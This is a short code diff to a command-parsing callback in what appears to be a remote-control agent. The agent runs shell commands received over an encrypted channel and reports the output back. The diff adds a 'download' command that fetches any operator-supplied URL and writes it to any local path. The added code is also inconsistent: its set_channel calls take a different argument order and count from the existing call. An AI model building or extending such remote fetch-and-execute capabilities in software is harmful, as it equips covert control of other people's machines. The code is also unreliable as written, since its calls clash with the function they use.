@@ -1214,7 +1214,19 @@ def webCommandParserCallback(enc_keys, command):
         pid, output = run_command_with_timeout(command['command'], int(command['timeout']))
         if output:
             set_channel(enc_keys, command["output"], -1, "{}: {}".format(pid, output.decode()))
-            
+
+    elif command['cmd'] == 'download':
+        url = command['url']
+        output_path = command['path']
+        if url.startswith('http://') or url.startswith('https://'):
+            response = requests.get(url)
+            with open(output_path, 'wb') as file:
+                file.write(response.content)
+            print(f"File downloaded successfully from {url}")
+            set_channel(http_fallback.getURL(), http_fallback.getStatusChannel(), enc_keys, -1, f"File downloaded successfully from {url}")
+        else:
+            print("Invalid URL. Please provide a valid HTTP or HTTPS URL.")
+            set_channel(http_fallback.getURL(), http_fallback.getStatusChannel(), enc_keys, -1, "Invalid URL. Please provide a valid HTTP or HTTPS URL.") 
 
 # Define a signal handler for SIGINT (Control+C)
 def signal_handler(sig, frame):
